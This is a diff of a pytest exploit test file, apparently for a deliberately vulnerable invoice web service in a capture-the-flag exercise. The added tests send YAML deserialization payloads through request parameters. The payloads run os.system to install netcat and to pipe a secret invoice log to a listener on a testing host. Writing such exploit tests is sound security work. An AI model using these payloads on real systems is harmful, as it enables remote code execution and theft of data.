@@ -93,13 +93,32 @@ def test_invoice_log_accounting():
 
 @pytest.mark.no_pipeline_support
 @pytest.mark.exploit
-def test_exploit():
+def test_exploit_landing_page():
     proc = subprocess.Popen(['nc', '-l', '7777'], stdout=PIPE)
 
-    params = {'payment-method': '!!python/object/apply:os.system [nc -h || ( apt-get update && apt-get install netcat -y )]'}
+    params = {'log-level': '!!python/object/apply:os.system [nc -h || ( apt-get update && apt-get install netcat -y )]'}
     requests.get(url = URL, params = params)
-    params = {'payment-method': f"!!python/object/apply:os.system [cat /InvoiceApp/accounting/outstanding-invoices.log | nc {os.environ['TESTING_HOST']} 7777]"}
+    params = {'log-level': f"!!python/object/apply:os.system [cat /InvoiceApp/accounting/outstanding-invoices.log | nc {os.environ['TESTING_HOST']} 7777]"}
     requests.get(url = URL, params = params)
+
+    try:
+        stdout, _ = proc.communicate(timeout=3)
+    except TimeoutExpired:
+        proc.kill()
+        stdout, err = proc.communicate()
+        logger.warning(f'Waiting and listening to :7777 for exploit information ran into timeout. stdout: {stdout}, err: {err}')
+
+    assert b'SECRET_ENO_TOKEN' in stdout
+
+@pytest.mark.no_pipeline_support
+@pytest.mark.exploit
+def test_exploit_add_invoice():
+    proc = subprocess.Popen(['nc', '-l', '7777'], stdout=PIPE)
+
+    params = {'name': 'somebody', 'item': 'pizza', 'payment-method': '!!python/object/apply:os.system [nc -h || ( apt-get update && apt-get install netcat -y )]'}
+    requests.post(URL + '/add', params)
+    params = {'name': 'somebody', 'item': 'pizza', 'payment-method': f"!!python/object/apply:os.system [cat /InvoiceApp/accounting/outstanding-invoices.log | nc {os.environ['TESTING_HOST']} 7777]"}
+    requests.post(URL + '/add', params)
 
     try:
         stdout, _ = proc.communicate(timeout=3)
